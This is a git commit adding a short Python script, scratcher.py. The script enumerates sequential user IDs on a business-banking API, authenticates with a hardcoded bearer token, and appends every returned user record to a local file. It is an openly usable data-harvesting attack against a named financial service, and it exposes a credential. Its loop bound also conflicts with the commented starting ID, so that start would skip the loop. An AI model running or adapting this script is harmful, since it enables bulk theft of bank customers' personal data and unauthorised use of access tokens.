e50d5c33b493894ad71568357fa81b273ac4c5cf
cyborg24 <53658824+cyborg24@users.noreply.github.com>
2023-03-30 09:25:02 -0500

    Add files via upload

---
+++ scratcher.py
@@ -0,0 +1,22 @@
+import requests, json, time
+
+bearer = "Bearer eyJhbGciOiJIUzI1NiJ9.eyJyb2xlcyI6IlVTRVIiLCJpYXQiOjE2ODAxMDM0MjAsInN1YiI6IjIyNTg3MiIsImV4cCI6MTY4MDE4OTgyMH0.NKuEsMrM557qjn2PAaba-BsYD5xnjsD6yIE9DS8F5l8"
+
+userid = input("Enter starting point: ") #400683
+userid = int(userid.strip())
+
+while userid < 333333:
+    userid += 1
+    url = f'https://business-banking.kudi.ai/user/{userid}'
+    mheaders = {"Authorization": bearer}
+    x = requests.get(url, headers = mheaders)
+    resp = x.text
+    resp2 = resp[27:46]
+    
+    if resp2 == "User does not exist":
+        print(f"{userid}==> user does not exist")
+    else:
+        print(x.text)
+        with open("AaD-2023.txt", "a") as handle:
+            handle.write(str(resp + "\n" + "------------------------------------------------------" + "\n" + "\n" + "------------------------------------------------------" + "\n"))
+            print("\n Recorded")
